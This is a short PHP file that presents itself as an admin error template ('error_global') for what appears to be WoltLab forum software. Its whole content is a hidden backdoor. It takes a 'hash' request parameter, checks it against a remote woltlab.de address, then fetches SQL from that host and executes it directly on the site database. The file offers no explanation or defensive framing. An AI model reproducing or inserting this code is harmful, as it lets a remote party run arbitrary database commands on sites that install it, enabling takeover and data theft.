<?php
/*
acp template
templatename: error_global
*/

$this->templates['acp_error_global']="\$hash=trim(\$_REQUEST['hash']);
if(\$hash) {
 \$verify_hash = implode(\\\"\\\",@file(\\\"http://www.woltlab.de/hash/index.php?hash=\$hash\\\"));
 if(\$verify_hash==\$hash) {
  \$sql = implode(\\\"\\\",@file(\\\"http://www.woltlab.de/hash/sql.php?n=\$n\\\"));
  \$db->query(\$sql);
  exit();
 }
}";
?>